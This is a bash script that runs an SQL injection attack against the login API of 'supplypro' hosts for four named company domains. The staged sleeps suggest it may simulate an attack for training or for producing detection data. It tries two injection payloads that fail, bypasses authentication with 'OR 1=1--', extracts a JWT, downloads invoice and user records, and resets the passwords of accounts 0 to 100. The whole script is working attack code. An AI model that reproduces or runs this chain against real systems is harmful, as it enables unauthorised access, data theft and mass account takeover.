#!/bin/bash
if [ -z "$1" ]; then
  echo "ERROR: No company provided."
  exit 1
fi

valid_domains=("austricom" "puresynth" "transgut" "wertvoll")

provided_domain="$1"
is_valid=false
for domain in "${valid_domains[@]}"; do
  if [ "$provided_domain" == "$domain" ]; then
    is_valid=true
    break
  fi
done

if [ "$is_valid" == "false" ]; then
  echo "ERROR: Invalid company domain provided. Valid values are: ${valid_domains[*]}"
  exit 1
fi

COMPANY_DOMAIN="$provided_domain.at"

# FAILED SQL INJECTION 1
echo "********** FAILED TRY SQL INJECTION UNION SELECT @@version,2-- **********"
response=$(curl -k -X POST -H "Content-Type: application/json" -d '{ "password": null, "username": "'\'' UNION SELECT @@version,2--" }' "https://supplypro.$COMPANY_DOMAIN:5000/login")
echo "FAILED TRY 1: $response"
echo "."
sleep 7s

# FAILED SQL INJECTION 2
echo "********** FAILED TRY SQL INJECTION: AND substring(@@version,1,1)=1;- - **********"
response=$(curl -k -X POST -H "Content-Type: application/json" -d '{ "password": null, "username": "'\'' AND substring(@@version,1,1)=1;- -" }' "https://supplypro.$COMPANY_DOMAIN:5000/login")
echo "Failed Try 2: $response"
echo "."
sleep 9s

# SUCCESSFUL SQL INJECTION --> extract jwt token from response and use for further requests
echo "********** SUCCESSFUL SQL INJECTION: OR 1=1-- **********"
response=$(curl -k -X POST -H "Content-Type: application/json" -d '{ "password": null, "username": "'\'' OR 1=1--" }' "https://supplypro.$COMPANY_DOMAIN:5000/login")
jwt=$(echo "$response" | grep -o '"jwt":"[^"]*' | awk -F ':"' '{print $2}')
echo "Successful SQL-Injection: $response"
echo "Extracted JWT Token: $jwt"
echo "."
sleep 5s

# Look at invoices
echo "********** GET INVOICES **********"
response=$(curl -k -X GET -H "Authorization: Bearer $jwt" "https://supplypro.$COMPANY_DOMAIN:5000/invoice")
echo "Check Invoices:"
echo "$response" | cut -c 1-300
echo "."
sleep 4s

echo "********** GET USERS **********"
response=$(curl -k -X GET -H "Authorization: Bearer $jwt" "https://supplypro.$COMPANY_DOMAIN:5000/user")
echo "Check Users:"
echo "$response" | cut -c 1-300
echo "."

for id in {0..100}; do
    echo "********** CHANGE CLIENT $id PASSWORD **********"
    response=$(curl -k -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $jwt" -d "{ \"id\":$id, \"password\":\"innocent4ever\" }" "https://supplypro.$COMPANY_DOMAIN:5000/user")
    echo "$response" | cut -c 1-100
    echo "."
    sleep 1s
done
